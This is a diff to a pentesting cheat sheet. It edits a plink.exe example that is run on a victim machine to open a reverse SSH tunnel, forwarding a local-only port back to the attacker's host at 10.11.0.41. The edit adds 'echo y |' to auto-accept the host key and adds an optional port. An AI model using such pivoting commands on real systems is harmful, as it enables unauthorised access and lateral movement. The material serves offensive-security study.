@@ -272,8 +272,8 @@ It's like a console PuTTY version \( the options are very similar to a ssh clien
 As this binary will be executed in the victim and it is a ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward a only locally accessible port to a port in our machine:
 
 ```bash
-plink.exe -l <Our_valid_username> -pw <valid_password> -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
-plink.exe -l root -pw password -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
+echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
+echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
 ```
 
 ## NTLM proxy bypass
